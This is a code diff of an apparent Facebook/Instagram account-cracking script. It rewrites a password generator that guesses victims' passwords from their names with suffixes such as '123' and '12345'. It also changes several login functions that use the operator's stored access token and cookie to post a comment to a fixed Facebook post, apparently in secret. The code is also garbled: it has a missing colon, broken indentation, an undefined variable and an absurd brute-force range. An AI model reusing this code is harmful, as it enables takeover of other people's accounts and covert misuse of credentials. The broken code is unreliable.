@@ -1213,24 +1213,40 @@ def urut_crack():
 ###----------[ GENERATE PASSWORD ]---------- ###
 def password(user):
     global pass_manual1, pass_manual2
-    results=[]
-    for i in text.split(" "):
-		if len(i)<3:continue
-		else:i=i.lower()
-		if len(i)==3 or len(i)==4 or len(i)==5:
-		  results.append(i+"123")
-		  results.append(i+"12345")
-	  else:
-	    results.append(i+"123")
-			results.append(i+"1234")
-			results.append(i+"12345")
-			results.append(i)
-			if "indonesia" in user:
-					results.append("sayang")
-					results.append("bismillah")
-					results.append("anjing")
-          results.append("123456")
-	return results
+    listpass = []
+    if nd in user.split(" ")
+        for user in range(0,10000000000000):listpass.append(str(x))
+        return listpass
+    else:
+        try:
+            ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
+            if len(na) < 2:
+                nd = na[0].lower()
+                if len(nd)<3:pass
+                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345")
+                else:listpass.append(nd);listpass.append(nd+"123");listpass.append(nd+"12345")
+                if pp in ['',' ','  ']:pass
+                else:
+                    for user in pp.split(','):listpass.append(user)
+            else:
+                nd = na[0].lower()
+                if len(nd)<3:pass
+                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345")
+                else:listpass.append(nd);listpass.append(nd+"123");listpass.append(nd+"12345")
+                nb = na[-1].lower()
+                if len(nb)<3:pass
+                elif len(nb)==3 or len(nb)==4 or len(nb)==5:listpass.append(nb+"123");listpass.append(nb+"12345")
+                else:listpass.append(nb);listpass.append(nb+"123");listpass.append(nb+"12345")
+                if pp in ['',' ','  ']:pass
+                else:
+                    for user in pp.split(','):listpass.append(nd+user);listpass.append(nb+user)
+            if ps in ['',' ','  ']:
+                pass
+            else:
+                for z in ps.split(','):listpass.append(z)
+            listpass.append(user.lower())
+            return listpass
+        except:return listpass
 
 ###----------[ ADD MANUAL PASS ]---------- ###
 def addpass():
@@ -1253,11 +1269,11 @@ def logger1(user,pasw): #--- Login Validate ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-       try:
+        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
         else:
@@ -1273,11 +1289,11 @@ def logger2(user,pasw): #--- Login Regular ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-        try:
+        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
         else:
@@ -1293,11 +1309,11 @@ def logger3(user,pasw): #--- Login Instagram ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
-        try:
+        if user != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
         else:
